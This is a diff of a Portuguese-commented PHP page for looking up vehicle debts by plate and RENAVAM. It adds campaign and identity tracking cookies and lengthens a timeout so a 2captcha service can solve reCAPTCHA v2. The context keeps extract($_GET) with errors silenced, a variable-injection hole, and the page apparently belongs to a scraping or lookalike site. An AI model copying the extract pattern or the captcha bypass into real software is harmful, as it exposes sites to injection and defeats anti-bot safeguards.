@@ -2,6 +2,21 @@
 error_reporting(0);
 extract($_GET);
 
+// Garantir que os cookies essenciais de rastreamento estejam presentes mesmo acessando a pasta diretamente
+if (empty($_COOKIE['user_id'])) {
+    $uniqueId = uniqid(mt_rand(), true);
+    setcookie('user_id', $uniqueId, time() + (86400 * 30), "/");
+    $_COOKIE['user_id'] = $uniqueId;
+}
+if (empty($_COOKIE['campanha'])) {
+    setcookie('campanha', '1', time() + (86400 * 30), "/");
+    $_COOKIE['campanha'] = '1';
+}
+if (empty($_COOKIE['Identity'])) {
+    setcookie('Identity', 'desconhecido', time() + (86400 * 30), "/");
+    $_COOKIE['Identity'] = 'desconhecido';
+}
+
 if($sucesso){
     include_once(__DIR__ . '/homex.php');
     return;
@@ -257,7 +272,7 @@ if($sucesso){
                 $.ajax({
                     url: '/api/mt2.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam),
                     method: 'GET',
-                    timeout: 45000 // 45 segundos por conta do 2captcha
+                    timeout: 120000 // 120 segundos por conta do 2captcha resolver o recaptcha v2
                 }).done(function(response) {
                     $('#btnConsultar').prop('disabled', false);
                     $('#btnConsultar').html('CONSULTAR DÉBITOS');
